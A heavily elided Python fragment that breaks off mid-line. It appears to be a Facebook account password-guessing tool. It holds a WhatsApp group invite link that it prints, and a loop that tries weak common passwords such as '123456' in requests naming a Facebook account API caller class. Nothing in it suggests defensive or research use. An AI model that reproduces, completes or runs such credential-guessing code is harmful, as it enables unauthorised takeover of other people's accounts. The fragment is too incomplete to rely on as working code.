...
channel_link = "https://chat.whatsapp.com/Dc3stKIwMEP5X4eKGHVm7T?mode=wwt"
...
def first_step():
    ...
    if not (channel_link.startswith("http://") or channel_link.startswith("https://")):
        ...
        try:
            ...
            print("https://chat.whatsapp.com/Dc3stKIwMEP5X4eKGHVm7T?mode=wwt")
    ...
    try:
        ...
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                ...
                'fb_api_caller_class': 'com.facebook.account.l
